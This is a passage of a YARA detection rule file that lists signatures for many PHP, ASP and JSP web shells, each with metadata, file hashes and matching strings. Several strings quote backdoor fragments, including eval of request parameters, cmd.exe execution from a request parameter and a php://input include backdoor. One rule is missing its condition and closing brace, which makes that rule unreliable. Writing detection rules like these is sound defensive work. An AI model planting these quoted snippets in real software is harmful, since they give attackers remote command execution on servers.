		$s4 = "print \"<form action=\\\"\".$me.\"?p=cmd&dir=\".realpath('.').\""
		$s8 = "print \"<td id=f><a href=\\\"?p=rename&file=\".realpath($file).\"&di"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Caidao_Shell_404
{
	meta:
		description = "Web Shell - file 404.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L758-L771"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "ee94952dc53d9a29bdf4ece54c7a7aa7"
		logic_hash = "0743d18bc5066c96cca8cc0883971d3bc876e6c2fbb996e55b6930c715e07395"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<?php $K=sTr_RepLaCe('`','','a`s`s`e`r`t');$M=$_POST[ice];IF($M==NuLl)HeaDeR('St"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_ASP_Aspydrv
{
	meta:
		description = "Web Shell - file aspydrv.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L772-L785"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "de0a58f7d1e200d0b2c801a94ebce330"
		logic_hash = "a4a6205ace49778ddc421b0f0e65c576e2ffe40ce2ab84debb939d5324420405"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "<%=thingy.DriveLetter%> </td><td><tt> <%=thingy.DriveType%> </td><td><tt> <%=thi"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Jsp_Web
{
	meta:
		description = "Web Shell - file web.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L786-L799"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "4bc11e28f5dccd0c45a37f2b541b2e98"
		logic_hash = "ed0ace0ba5f8a9e763353c42e3e3a39da10596e8517aad33e5c5080b44e4d61a"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<%@page import=\"java.io.*\"%><%@page import=\"java.net.*\"%><%String t=request."

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Mysqlwebsh
{
	meta:
		description = "Web Shell - file mysqlwebsh.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L800-L813"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "babfa76d11943a22484b3837f105fada"
		logic_hash = "365d19c086b3bbb98cbe1e1ed1e7522ce98dc2614a39c747717c277cebef33d2"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = " <TR><TD bgcolor=\"<? echo (!$CONNECT && $action == \"chparam\")?\"#660000\":\"#"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Jspshell
{
	meta:
		description = "Web Shell - file jspShell.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L814-L828"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "0d5b5a17552254be6c1c8f1eb3a5fdc1"
		logic_hash = "058ddd64b142cada7144b9befa81ada314b72e6f23524d98efcb10136c23ed33"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<input type=\"checkbox\" name=\"autoUpdate\" value=\"AutoUpdate\" on"
		$s1 = "onblur=\"document.shell.autoUpdate.checked= this.oldValue;"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Dx_Dx
{
	meta:
		description = "Web Shell - file Dx.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L829-L843"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "9cfe372d49fe8bf2fac8e1c534153d9b"
		logic_hash = "c2eddf58b25caff79460ab9a87ac0573d483866a87c1b1ec0984afce2c22b29f"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "print \"\\n\".'Tip: to view the file \"as is\" - open the page in <a href=\"'.Dx"
		$s9 = "class=linelisting><nobr>POST (php eval)</td><"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_Asp_Ntdaddy
{
	meta:
		description = "Web Shell - file ntdaddy.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L844-L858"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "c5e6baa5d140f73b4e16a6cfde671c68"
		logic_hash = "7237eb7233c6affcc1f67a764f704b7d7e1d13f71c64893286c6c99318cc7c3e"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s9 = "if  FP  =  \"RefreshFolder\"  or  "
		$s10 = "request.form(\"cmdOption\")=\"DeleteFolder\"  "

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_Mysql_Web_Interface_Version_0_8
{
	meta:
		description = "Web Shell - file MySQL Web Interface Version 0.8.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L859-L872"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "36d4f34d0a22080f47bb1cb94107c60f"
		logic_hash = "680d4368804ad21e46dbe400563beca3ef724711b5432dccce1276ecadc04f2c"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "href='$PHP_SELF?action=dumpTable&dbname=$dbname&tablename=$tablename'>Dump</a>"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Elmaliseker_2
{
	meta:
		description = "Web Shell - file elmaliseker.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L873-L887"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "b32d1730d23a660fd6aa8e60c3dc549f"
		logic_hash = "ca300cd142b3c8b820d3b5f5a56eeb834d9acb1d85916b932bd67fb4a25f4ed0"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "<td<%if (FSO.GetExtensionName(path & \"\\\" & oFile.Name)=\"lnk\") or (FSO.GetEx"
		$s6 = "<input type=button value=Save onclick=\"EditorCommand('Save')\"> <input type=but"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_ASP_Remexp
{
	meta:
		description = "Web Shell - file RemExp.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L888-L902"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "aa1d8491f4e2894dbdb91eec1abc2244"
		logic_hash = "7a3b35c4a16f26167180cea81f67de101edabb9b35479f7e5acae7f3fe07f304"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<td bgcolor=\"<%=BgColor%>\" title=\"<%=SubFolder.Name%>\"> <a href= \"<%=Reques"
		$s1 = "Private Function ConvertBinary(ByVal SourceNumber, ByVal MaxValuePerIndex, ByVal"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Jsp_List1
{
	meta:
		description = "Web Shell - file list1.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L903-L917"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "8d9e5afa77303c9c01ff34ea4e7f6ca6"
		logic_hash = "61ecafe477d98c5eb6887a9ff50960fc28b84512d09a36c02588159b08b395a4"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "case 's':ConnectionDBM(out,encodeChange(request.getParameter(\"drive"
		$s9 = "return \"<a href=\\\"javascript:delFile('\"+folderReplace(file)+\"')\\\""

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Phpkit_1_0_Odd
{
	meta:
		description = "Web Shell - file odd.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L918-L933"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "594d1b1311bbef38a0eb3d6cbb1ab538"
		logic_hash = "bf99d6a71b9ef72574d928a09f3a479f2f819287d78c9a5435e45752e76a59bf"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "include('php://input');" fullword
		$s1 = "// No eval() calls, no system() calls, nothing normally seen as malicious." fullword
		$s2 = "ini_set('allow_url_include, 1'); // Allow url inclusion in this script" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Jsp_123
{
	meta:
		description = "Web Shell - file 123.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L934-L949"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "c691f53e849676cac68a38d692467641"
		logic_hash = "48925d3a302bf09ecb3f031301ca8afc722c7ef53b87efa27a3c4b58ee15217d"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<font color=\"blue\">??????????????????:</font><input type=\"text\" size=\"7"
		$s3 = "String path=new String(request.getParameter(\"path\").getBytes(\"ISO-8859-1\""
		$s9 = "<input type=\"submit\" name=\"btnSubmit\" value=\"Upload\">    " fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Asp_1
{
	meta:
		description = "Web Shell - file 1.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L950-L964"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "8991148adf5de3b8322ec5d78cb01bdb"
		logic_hash = "9cae40c8fc3966942a8fc3ee0f5d07081ba2d1c1c3156144488ba64015d6838b"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "!22222222222222222222222222222222222222222222222222" fullword
		$s8 = "<%eval request(\"pass\")%>" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_ASP_Tool
{
	meta:
		description = "Web Shell - file tool.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L965-L980"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "4ab68d38527d5834e9c1ff64407b34fb"
		logic_hash = "62ba39bac09cb403a47678cd38c519642cc3c20f43c470b828ec448c42e9bb73"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Response.Write \"<FORM action=\"\"\" & Request.ServerVariables(\"URL\") & \"\"\""
		$s3 = "Response.Write \"<tr><td><font face='arial' size='2'><b>&lt;DIR&gt; <a href='\" "
		$s9 = "Response.Write \"<font face='arial' size='1'><a href=\"\"#\"\" onclick=\"\"javas"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Cmd_Win32
{
	meta:
		description = "Web Shell - file cmd_win32.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L981-L995"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "cc4d4d6cc9a25984aa9a7583c7def174"
		logic_hash = "b90ba15b7b2c557f7b2303695b7f1f737f63df06d712c89e0cfea51c7d37e21d"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Process p = Runtime.getRuntime().exec(\"cmd.exe /c \" + request.getParam"
		$s1 = "<FORM METHOD=\"POST\" NAME=\"myform\" ACTION=\"\">" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Jsp_Jshell
{
	meta:
		description = "Web Shell - file jshell.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L996-L1013"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "124b22f38aaaf064cef14711b2602c06"
		logic_hash = "dfe3ac097de4ca406ab7ec967fdc03d1e87c74f84fc675b58438a842d80cccda"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "kXpeW[\"" fullword
		$s4 = "[7b:g0W@W<" fullword
		$s5 = "b:gHr,g<" fullword
		$s8 = "RhV0W@W<" fullword
		$s9 = "S_MR(u7b" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_ASP_Zehir4
{
	meta:
		description = "Web Shell - file zehir4.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L1014-L1027"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "7f4e12e159360743ec016273c3b9108c"
		logic_hash = "aa3e07ee6369dd5f86f28a53c8e45391de718d4935021339a7b47829b5196f54"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s9 = "Response.Write \"<a href='\"&dosyaPath&\"?status=7&Path=\"&Path&\"/"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Wsb_Idc
{
	meta:
		description = "Web Shell - file idc.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L1028-L1042"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "7c5b1b30196c51f1accbffb80296395f"
		logic_hash = "f274061f1a02ab65bc574a6586343f74262a463c5200cd2c231a752f54967404"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "if (md5($_GET['usr'])==$user && md5($_GET['pass'])==$pass)" fullword
		$s3 = "{eval($_GET['idc']);}" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_Cpg_143_Incl_Xpl
{
	meta:
		description = "Web Shell - file cpg_143_incl_xpl.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L1043-L1057"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "5937b131b67d8e0afdbd589251a5e176"
		logic_hash = "7c2ce25c33e167761d72331d7c4d4f7cd6029ee0caf6e2008df8b12894faaaf8"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "$data=\"username=\".urlencode($USER).\"&password=\".urlencode($PA"
		$s5 = "fputs($sun_tzu,\"<?php echo \\\"Hi Master!\\\";ini_set(\\\"max_execution_time"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_Mumaasp_Com
{
	meta:
		description = "Web Shell - file mumaasp.com.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L1058-L1071"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "cce32b2e18f5357c85b6d20f564ebd5d"
		logic_hash = "75e2a056782190e9914264b9e34002faea75a35ab0f97bf1e05dec15432d064c"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "&9K_)P82ai,A}I92]R\"q!C:RZ}S6]=PaTTR"

rule SIGNATURE_BASE_Webshell_Php_404
{
	meta:
		description = "Web Shell - file 404.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L1072-L1085"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "ced050df5ca42064056a7ad610a191b3"
		logic_hash = "3fc928e6edda8fdc4220f57215db61b7fbf8de5b00423b219a173c8ecde40b79"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "$pass = md5(md5(md5($pass)));" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Webshell_Cnseay_X
{
	meta:
		description = "Web Shell - file webshell-cnseay-x.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L1086-L1099"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "a0f9f7f5cd405a514a7f3be329f380e5"
		logic_hash = "59cb8b8a5873b716a25096c7b12f09293a812b63f31fea07d919b9c4d2bc9a19"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s9 = "$_F_F.='_'.$_P_P[5].$_P_P[20].$_P_P[13].$_P_P[2].$_P_P[19].$_P_P[8].$_P_"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Asp_Up
{
	meta:
		description = "Web Shell - file up.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L1100-L1114"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "f775e721cfe85019fe41c34f47c0d67c"
		logic_hash = "dff2896d2226ade08e74147121a0e0036e8545dfff36b48b5a0771c9c7d537e9"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Pos = InstrB(BoundaryPos,RequestBin,getByteString(\"Content-Dispositio"
		$s1 = "ContentType = getString(MidB(RequestBin,PosBeg,PosEnd-PosBeg))" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_Phpkit_0_1A_Odd
{
	meta:
		description = "Web Shell - file odd.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L1115-L1131"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "3c30399e7480c09276f412271f60ed01"
		logic_hash = "745734658ed4000e1399531ae44125f8462ecd37388e6223cfa9bf91dbb52bbc"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "include('php://input');" fullword
		$s3 = "ini_set('allow_url_include, 1'); // Allow url inclusion in this script" fullword
		$s4 = "// uses include('php://input') to execute arbritary code" fullword
		$s5 = "// php://input based backdoor" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_ASP_Cmd
{
	meta:
		description = "Web Shell - file cmd.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L1132-L1145"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "97af88b478422067f23b001dd06d56a9"
		logic_hash = "c1353e43876e18f18638a558a29a12d6e82603641fedd81b042adca91fea0d18"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_PHP_Shell_X3
{
	meta:
		description = "Web Shell - file PHP Shell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L1146-L1161"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "a2f8fa4cce578fc9c06f8e674b9e63fd"
		logic_hash = "7361a7eecf345b9c1809294b6b081db8769805ec3e6c656adc4ac87261193683"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "&nbsp;&nbsp;<?php echo buildUrl(\"<font color=\\\"navy\\\">["
		$s6 = "echo \"</form><form action=\\\"$SFileName?$urlAdd\\\" method=\\\"post\\\"><input"
		$s9 = "if  ( ( (isset($http_auth_user) ) && (isset($http_auth_pass)) ) && ( !isset("

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_PHP_G00Nv13
{
	meta:
		description = "Web Shell - file g00nv13.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L1162-L1176"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "35ad2533192fe8a1a76c3276140db820"
